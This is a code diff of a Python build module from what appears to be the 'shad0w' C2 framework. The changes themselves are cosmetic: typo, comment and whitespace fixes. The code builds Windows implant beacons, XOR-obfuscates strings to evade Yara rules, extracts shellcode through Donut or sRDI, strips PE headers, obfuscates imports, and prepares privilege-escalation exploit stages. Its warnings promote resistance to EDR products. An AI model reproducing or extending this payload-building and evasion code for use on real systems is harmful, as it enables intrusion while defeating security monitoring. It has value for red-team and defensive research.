@@ -8,22 +8,22 @@ import random
 from lib import shellcode
 
 # warnings to the user about the module they are using
-secure_warning = """The secure payload makes heavy use of new windows features and ntdll api hooking.
-This can make the payload a lot more resistant to EDR products but can also make it more unstable.
-Its been tested on:
-    -   x64 Windows 8.1, x64 Windows 10 (Pro & Enterprise)
-    -   x64 Windows Server 2019
+secure_warning = """The secure payload makes heavy use of new Windows features and ntdll API hooking. This can
+make the payload a lot more resistant to EDR products, but can also make it more unstable.
+It has been tested on:
+    x64 Windows 8.1, x64 Windows 10 (Pro & Enterprise)
+    x64 Windows Server 2019
 It may work on other systems as well.
 """
-static_warning = """Static payloads can be very large and much easier to detect.
-For use in droppers, loaders, exploits etc staged payloads are recommended as they are much smaller, so easier to use.
+static_warning = """Static payloads can be very large and much easier to detect. For use in droppers, loaders, 
+exploits, etc, staged payloads are recommended as they are much smaller and easier to use.
 """
 
-def clone_source_files(rootdir="src", builddir="build", basedir="/root/shad0w/beacon", asm=False, backmake=False):
-    # move the source files of the beacon over
-    # to the build directory
 
-    # put us in the correct dir (this obviously needs to be inside docker)
+def clone_source_files(rootdir="src", builddir="build", basedir="/root/shad0w/beacon", asm=False, backmake=False):
+    # move the source files of the beacon over to the build directory
+
+    # put us in the correct dir (this obviously needs to be inside Docker)
     os.chdir(basedir)
 
     # clean the build dir
@@ -37,11 +37,11 @@ def clone_source_files(rootdir="src", builddir="build", basedir="/root/shad0w/be
 
     return
 
-def update_settings_file(shad0wbuild, custom_template=None, custom_path=None):
-    # update the settings so that when we build
-    # we will use our new args
 
-    # this is hardcoded so will need docker
+def update_settings_file(shad0wbuild, custom_template=None, custom_path=None):
+    # update the settings so that when we build, we will use our new args
+
+    # this is hardcoded so will need Docker
     if custom_path == None:
         settings_path = "/root/shad0w/beacon/build/settings.h"
     elif custom_path != None:
@@ -65,6 +65,7 @@ def update_settings_file(shad0wbuild, custom_template=None, custom_path=None):
 
     return
 
+
 def _crypt_string(raw_string, key):
     # xor encrypt a string with a provided key
     crypt_string = ""
@@ -73,13 +74,15 @@ def _crypt_string(raw_string, key):
 
     return base64.b64encode(crypt_string.encode())
 
+
 def _gen_key(name):
     key = hex(random.randint(0, 100))
     return f"#define {name}_KEY {key}", key
 
+
 def _crypt_strings():
     # encrypt strings so they are not hanging around in the binary waiting to be
-    # thrown into a yara rule. This is obsfication not encryption
+    # thrown into a Yara rule. This is obfuscation not encryption
 
     new_file = ""
 
@@ -105,7 +108,6 @@ def _crypt_strings():
         return
 
 
-
 def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=None, modlocation="/root/shad0w/beacon/beacon.exe", debug=False, make_target=None):
     # build the beacon from the source files, making sure to
     # obey the correct payload settings that we have been given
@@ -123,7 +125,8 @@ def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=N
     # remove the old file
     try:
         os.unlink(modlocation)
-    except: pass
+    except:
+        pass
 
     # make sure we in the correct build dir
     os.chdir(builddir)
@@ -163,12 +166,12 @@ def make_in_clone(arch=None, platform=None, secure=None, static=None, builddir=N
 
     return True
 
+
 def extract_shellcode(beacon_file="/root/shad0w/beacon/beacon.exe", want_base64=False, donut=True, srdi=False):
-    # use donut or srdi to extract the shellcode from
-    # our newly created beacon
+    # use Donut or srdi to extract the shellcode from our newly created beacon
 
     if donut and not srdi:
-        # use donut to get it
+        # use Donut to get it
         if want_base64 is False:
             code = shellcode.generate(beacon_file, None, None, parse=False)
 
@@ -184,7 +187,7 @@ def extract_shellcode(beacon_file="/root/shad0w/beacon/beacon.exe", want_base64=
         # null out the pe header
         flags |= 0x1
 
-        # obfusicate the imports, with no delay
+        # obfuscate the imports, with no delay
         flags = flags | 0x4 | 0 << 16
 
         if want_base64 is False:
@@ -194,6 +197,7 @@ def extract_shellcode(beacon_file="/root/shad0w/beacon/beacon.exe", want_base64=
             code = base64.b64encode(shellcode.generate_srdi(beacon_file, flags)).decode()
 
     return code
+
 
 def write_and_bridge(filename, rcode, noremove=False):
     # write the supplied code to the file given
@@ -213,6 +217,7 @@ def write_and_bridge(filename, rcode, noremove=False):
 
     return len(rcode)
 
+
 def raise_issue_payload(string):
 
         # throw an error with the payload string
@@ -220,6 +225,7 @@ def raise_issue_payload(string):
 
         # exit with error code
         exit(-1)
+
 
 def get_payload_variables(payload_string, warn=True):
 
@@ -241,7 +247,7 @@ def get_payload_variables(payload_string, warn=True):
         except IndexError:
             raise_issue_payload(payload_string)
 
-        # these two dont matter as much
+        # these two don't matter as much
         try:
             secure   = payload[2]
             static   = payload[3]
@@ -273,6 +279,7 @@ def get_payload_variables(payload_string, warn=True):
 
         # return our generated args
         return arch, platform, secure, static
+
 
 def elevate_auto_build(rootdir=None, template=None, arch=None, check=False, exploit=False):
     # make the build process quicker for modules
@@ -307,6 +314,7 @@ def elevate_auto_build(rootdir=None, template=None, arch=None, check=False, expl
     # give the shellcode back
     return rcode
 
+
 def shellcode_to_array(data):
     length = 0
     line_len = 0
@@ -329,14 +337,14 @@ def shellcode_to_array(data):
             line_len += 1
             continue
 
-        # keep the correct sytax at the start
+        # keep the correct syntax at the start
         if length == 0:
             array += f"{hex(i)}, "
             length += 1
             line_len += 1
             continue
 
-        # keep the correct synatx though out
+        # keep the correct syntax though out
         elif length != 0:
             array += f"{hex(i)}, "
             length += 1
@@ -368,7 +376,7 @@ def elevate_build_stage(shad0w, rootdir=None, os=None, arch=None, secure=None, f
         update_settings_file(None, custom_template=settings_template)
 
         # now we need to run 'make' inside the cloned dir
-        # shad0w.debug.spinner(f"Preparing exploit...")
+        # shad0w.debug.spinner(f"Preparing exploit.")
         make_in_clone(arch=arch, platform=os, secure=secure, static=True)
         # shad0w.debug.stop_spinner = True
 
@@ -392,6 +400,7 @@ def elevate_build_stage(shad0w, rootdir=None, os=None, arch=None, secure=None, f
     with open(stagefile, "w+") as file:
         file.write(stage_template)
 
+
 def _random_string(length):
     rstring = ""
     alphabet = string.ascii_lowercase + string.ascii_uppercase
@@ -400,6 +409,7 @@ def _random_string(length):
         rstring += random.choice(alphabet)
 
     return rstring
+
 
 def shrink_exe(name):
     os.system(f"strip {name} 1>/dev/null 2>&1")
